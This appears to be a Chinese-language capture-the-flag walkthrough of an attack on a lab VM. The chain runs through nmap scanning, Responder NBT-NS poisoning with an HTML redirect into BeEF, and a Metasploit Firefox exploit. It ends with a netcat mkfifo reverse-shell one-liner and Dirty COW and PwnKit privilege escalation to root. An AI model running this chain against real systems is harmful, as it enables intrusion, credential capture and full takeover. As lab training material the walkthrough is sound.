VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
Nmap scan report for 192.168.253.237




--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.237 -p- -A

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.6.6 (workgroup: WORKGROUP)



--------------------------------------------
--------------------------------------------
3、responder欺骗攻击

responder 这个工具首先是一个LLMNR和NBT-NS响应者，它将根据它们的名字后缀来回答特定的NBT-NS（NetBIOS名称服务）查询 。默认情况下，该工具只会回答针对SMB的文件服务器服务请求。这背后的概念是针对我们的答案，并在网络上隐身。这也有助于确保我们不会破坏合法的NBT-NS行为。如果您希望此工具回答工作站服务请求名称后缀，可以通过命令行将-r选项设置为1，kali自带该工具！！

下载地址：
git clone https://github.com/SpiderLabs/Responder.git

嗅探eth0网卡段内的数据信息：
responder -I eth0 -w -r -f


[*] [NBT-NS] Poisoned answer sent to 192.168.253.237 for name DISNEYWORLD (service: Workstation/Redirector)
[FINGER] OS Version     : Unix
[FINGER] Client Version : Samba 3.6.6


在渗透测试中，使用Responder开启回应请求功能，Responuer会自动回应客户端的请求并声明自己就是被输人了错误计算机名的那台机器，并且尝试建立SMB连接。客户端项发送自已的Nt-NTeLM Hash进行身份验证，此时将得到目标机器的Net-NTLM Hash！！

cd /usr/share/responder/

./Responder.py --basic -I eth0 -wrf

-b, --basic 返回基本 HTTP 身份验证。 默认值：NTLM
-I eth0, --interface=eth0
-w -r -f   ---建立上游代理服务


BeEF 是浏览器开发框架的缩写。它是一款专注于网络浏览器的渗透测试工具。

随着人们越来越担心针对客户端（包括移动客户端）的网络攻击，BeEF 允许专业的渗透测试人员通过使用客户端攻击向量来评估目标环境的实际安全状况。与其他安全框架不同，BeEF 超越了加固的网络边界和客户端系统，并在一扇敞开的门的上下文中检查可利用性：Web 浏览器。BeEF 将挂钩一个或多个 Web 浏览器，并将它们用作启动定向命令模块的滩头阵地，并从浏览器上下文中进一步攻击系统

https://www.kali.org/tools/beef-xss/
没有的直接下载即可，270多mb！  ---挂代理下载
proxychains apt-get update  ---更新下源
proxychains apt install beef-xss

它是一个专注于Web浏览器的渗透测试工具。 ​BeEF使专业的渗透测试人员可以使用客户端攻击向量来评估目标环境的实际安全状况。 与其他安全框架不同，BeEF超越了硬化的网络边界和客户端系统，并在一个门户开放的环境中检查可利用性：Web浏览器。


开启：
beef-xss start

或者：
beef的配置文件：/etc/beef-xss/config.yaml
beef的默认用户名密码为beef、beef，如果需要更改beef的用户密码，则在配置文件里面更改user和passwd的值


登录：
http://127.0.0.1:3000/ui/authentication
账号密码：beef、dayu

进来后发现：
Welcome to BeEF!

Before being able to fully explore the framework you will have to 'hook' a browser. To begin with you can point a browser towards the basic demo page here, or the advanced version here.

点击here：
http://127.0.0.1:3000/demos/basic.html

cd /usr/share/responder/files
vi dayu.html
---------
<html>
<meta http-equiv="refresh" content="0; URL='http://192.168.253.138:3000/demos/basic.html'" />
<html>
---------

gedit /usr/share/responder/Responder.conf
80行修改：
Serve-Html = On

82行修改：
HtmlFilename = files/dayu.html

修改完后执行：
./Responder.py --basic -I eth0 -wrf
[HTTP] Sending file files/dayu.html to 192.168.253.237
[HTTP] Sending file files/dayu.html to 192.168.253.237

这时候在BEEF上就能看到连接了浏览器：firefox


--------------------------------------------
--------------------------------------------
MSF进攻

search firefox
选择：39 exploit/multi/browser/firefox_tostring_console_injection
use 39
run  ---直接运行
[*] Using URL: http://192.168.253.138:8080/OnBp6P92HK

然后将dayu.html修改为：http://192.168.253.138:8080/OnBp6P92HK
然后重新运行：
./Responder.py --basic -I eth0 -wrf


nc -vlp 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 1234 >/tmp/f

python -c 'import pty;pty.spawn("/bin/bash")'



内部信息收集：
1）Linux version 3.5.0-17-generic
2）*/3 * * * * DISPLAY=:0 /bin/bash /home/leopold/browse.sh


提权：

cp /usr/share/exploitdb/exploits/linux/local/40839.c .
gcc -pthread 40839.c -o dirty -lcrypt
chmod +x dirty
密码输入：dayu   ---等待几十秒

su firefart
dayu

firefart@leopold:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
成功拿到root权限！

方法2：
PwnKit-Exploit-main-2021-4034
make编译出exploit
./explot
成功提权！



知识拓展：

1）beef-xss基础操作

beef-xss# 命令方式启动
beef-xss-stop           # 命令方式关闭 
systemctl start beef-xss.service    #开启
beefsystemctl stop beef-xss.service     #关闭
beefsystemctl restart beef-xss.service  #重启beef


Hocked Browers：
online browers 在线浏览器
offline browers 离线浏览器

Detials：
浏览器、插件版本信息，操作系统信息

Logs：
浏览器动作：焦点变化，鼠标单击，信息输入

commands：
绿色模块：表示模块适用当前用户，并且执行结果对用户不可见
红色模块：表示模块不适用当前用户，有些红色模块也可以执行
橙色模块：模块可用，但结果对用户可见
灰色模块：模块为在目标浏览器上测试过


2）如果在大型环境下，可以执行IP进行！

gedit /usr/share/responder/Responder.conf
49行修改：
DontRespondTo = IP（指定IP即可）


3）
https://blog.csdn.net/qq_30285985/article/details/107896343



NBNS是网络基本输入/输出系统(NetBIOS)名称服务器的缩写。它也是TCP/IP协议的一部分。它负责将计算机名转化为对应的IP。其中，NamequeryNB是请求包，NamequeryresponseNB是响应包。双方的端口号均为137。NBNS在WIndows用的较少，Windows普遍采用LLMNR协议


如果客户端/目标无法通过DNS域名解析，则会回退到LLMNR（在Windows Vista中引入）和NBT-NS进行解析。




































































































